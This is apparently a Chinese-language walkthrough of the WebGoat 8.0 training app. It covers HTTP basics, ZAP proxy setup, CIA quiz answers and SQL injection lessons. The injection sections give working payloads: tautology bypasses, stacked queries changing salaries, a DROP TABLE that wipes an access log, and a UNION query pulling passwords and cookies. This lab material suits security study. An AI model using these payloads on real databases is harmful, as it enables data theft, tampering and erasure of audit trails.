# Webgoat 8.0 writeup

## 通用部分
### HTTP Basics
这部分内容旨在介绍HTTP协议的基本内容，如何工作。

需要掌握的关键是：
- 客户端访问服务器时发送请求和获得响应的实质
- Get request
- Post request
- User-Agent
- Accept

在练习中，可以通过查看源码、打开开发者模式界面查看请求信息得到答案。

### HTTP Proxies

这部分介绍了使用代理，截获 web客户端与服务器之间的通信流量，对于部分内容进行修改的过程。

Proxies的功能很丰富，善加应用可以完成很多安全功能。

常用的Web代理：
- Burpsuite
- ZAP
- ...

课程中重点介绍了 Owasp ZAP 的安装使用，虽然很多人习惯使用Burpsuite，但ZAP是开源免费的，而且功能也很齐全。

Owasp ZAP 的代理设置在菜单 Tools-Options-Local Proxy 中设置。

Firefox 浏览器的代理设置在其高级设置中；Chrome浏览器的代理设置现在需要设置本地代理，麻烦一些。

设置完毕后，需要验证代理是否正常工作，即验证网页访问能被代理正常拦截，且能手动放行。

为了能够聚焦客户端到服务器的访问，访问页面中自己访问服务器的行为可以不关注，通过在代理中设置"exclude from"，不再阻止和观察这些流量，有助于我们集中注意力。例如，我们可以在 exclude from.. 窗口中增加设置：

```
http://localhost:8080/WebGoat/service/.*
http://localhost:8080/WebGoat/.*.lesson.lesson
```

题目不难，要注意大小写。

### CIA triad

CIA 原则是一个信息安全模型。这3个原则考虑了最为关键的信息安全嘴贱和所有系统都应该保护的方面。

1. How could an intruder harm the security goal of confidentiality?选c

Solution 1: By deleting all the databases.
Solution 2: By stealing a database where general configuration information for the system is stored.
Solution 3: By stealing a database where names and emails are stored and uploading it to a website.
Solution 4: Confidentiality can't be harmed by an intruder.

2. How could an intruder harm the security goal of integrity?选a

Solution 1: By changing the names and emails of one or more users stored in a database.
Solution 2: By listening to incoming and outgoing network traffic.
Solution 3: By bypassing authentication mechanisms that are in place to manage database access.
Solution 4: Integrity can only be harmed when the intruder has physical access to the database storage.
3. How could an intruder harm the security goal of availability?选d

Solution 1: By exploiting bugs in the systems software to bypass authentication mechanisms for databases.
Solution 2: By redirecting emails with sensitive data to other individuals.
Solution 3: Availability can only be harmed by unplugging the power supply of the storage devices.
Solution 4: By launching a denial of service attack on the servers.
4. What happens if at least one of the CIA security goals is harmed?选b

Solution 1: A system can be considered safe until all the goals are harmed. Harming one goal has no effect on the systems security.
Solution 2: The systems security is compromised even if only one goal is harmed.
Solution 3: It's not that bad when an attacker reads or changes data, at least some data is still available, hence only when the goal of availability is harmed the security of the system is compromised.
Solution 4: It shouldn't be a problem if an attacker changes data or makes it unavailable, but reading sensitive data is not tolerable. Theres only a problem when confidentiality is harmed.

### Google chrome 开发者工具

console 可以运行JavaScript本地脚本。查看页面内容和其他信息。‘undifined'表示你调用的JavaScript函数没有返回任何东西。


打开console ，键入```webgoat.customjs.phoneHome()```，调用页面已加载的脚本函数，可以得到一个输出，把输出中的数字复制出来即可。

source 面板可以看源代码

network 面板可以看网络通信过程。

在network中观察form表单数据，就能得到答案。

## 注入缺陷

### sql注入-介绍

第一题，Try to retrieve the department of the employee Bob Franco.，键入sql语句：```select department from employees where first_name='Bob' and last_name='Franco'```

第二题，Try to change the department of Tobi Barnett to 'Sales'. 键入sql语句：```UPDATE employees SET department='Sales' where first_name='Tobi' and last_name='Barnett'```

第三题，try to modify the scheme by adding the column "phone" (varchar(20)) to the table "employees". :键入下列语句：
```ALTER TABLE employees ADD phone varchar(20);```


第4题，Try to grant the usergroup "UnauthorizedUser" the right to alter tables: 输入下列语句：```GRANT alter table TO UnauthorizedUser```


#### sql注入

sql注入会导致：
- 数据库中的敏感数据被读取和改动
- 数据库管理员权限操作
  - 关闭数据库
  - 关闭审计
  - 清除表和记录
  - 增加用户
- 恢复戈丁文件的内容
- 发现OS问题命令

第9题 try to retrieve all the users from the users table。
选```'```和```'1'='1```
。

#### Numeric SQL

第10题 Using the two Input Fields below, try to retrieve all the date from the users table.

两个输入框，分别键入：
- ```1```
- ``` 1 or '1'='1'```

数字型sql注入，特点就是录入的是数字，不需要加包含字符串的引号。

#### 字符型注入

字符型注入需要考虑引号了。

第11题，分别输入：
- 1' or '1'='1
- 1

#### 查询链

SQL 查询链就是一个跟在另一个查询后面。你可以使用标记查询结束的分号```;```这一元字符，它允许在一行中开始一个新的查询。
第一空输入Smith

第二空可以先用 ```3SL99A' ; select *  from employees where '1'='1``` 查一下表内情况。 然后再输入下列语句：


```3SL99A' ;UPDATE employees SET SALARY=99999 where LAST_NAME='Smith```


#### 破坏可用性

使用SQL注入的方法破坏机密性、完整性，也可以破坏可用性。

例如：
- 修改密码或用户名
- 取消某个用户的访问权限
- 删除部分或全部数据

第13题，To delete access_log table completely before anyone notices.

输入框中键入```1 ; select * from access_log```，提交后发现查询成功，但没有数据。

再次输入下列语句：```'; DROP TABLE access_log ;--```

### 高级 SQL 注入

- 结合型技术
- 盲注

6.a 键入命令```' OR '1'='1';  select * from user_system_data --```

也可以使用union语句完成：```' or 1=1  union select userid, user_name, password,cookie,'1','1',1 from user_system_data -- ```


6.b ```passW0rD```

